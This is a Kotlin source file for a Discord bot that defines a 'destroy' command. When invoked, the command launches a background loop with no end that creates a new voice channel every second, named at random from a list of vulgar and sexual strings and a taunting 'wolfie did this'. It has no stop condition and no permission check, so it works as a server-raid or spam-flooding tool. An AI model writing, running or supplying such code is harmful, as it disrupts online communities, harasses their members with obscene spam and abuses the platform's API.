package app.commands.trash

import app.commands.abstract.StandardCommand
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.javacord.api.DiscordApi
import org.javacord.api.event.message.MessageCreateEvent
import kotlin.random.Random

class Destroy : StandardCommand() {
    override val commandName = "destroy"

    override fun action(event: MessageCreateEvent) {
        val names = listOf("hack machine", "pee", "zt!fuck", "zt!porn", "sex", "cum", "balls", "wolfie did this")

        GlobalScope.launch { // launch a new coroutine in background and continue
            while (true) {
                delay(1000L) // non-blocking delay for 1 second (default time unit is ms)

                val vc = event.server.get().createVoiceChannelBuilder()
                vc.setName(names.random())
                vc.setUserlimit(2)
                vc.create()
            }
        }
    }
}